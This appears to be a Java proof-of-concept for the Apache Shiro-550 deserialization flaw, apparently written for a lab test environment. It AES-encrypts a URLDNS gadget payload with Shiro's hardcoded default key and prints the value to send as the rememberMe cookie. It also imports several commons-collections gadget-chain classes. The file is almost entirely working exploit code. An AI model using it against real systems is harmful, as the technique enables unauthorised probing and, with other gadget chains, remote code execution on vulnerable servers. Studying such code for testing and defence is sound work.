


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.InvokerTransformer;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import util.SerializeUtil;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.*;

/**
 * cc2的测试环境
 * jdk7
 * cc版本4.0
 *
 * **/
public class vuln_shiro550 {
    public static void main(String[] args) throws Exception {
        AesCipherService aesCipherService = new AesCipherService();
        byte[] getpayload = payloadURLDNS.getpayloadURLDNS();
        ByteSource encrypt = aesCipherService.encrypt(getpayload,Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA=="));
        System.out.println(encrypt.toString());


    }





}
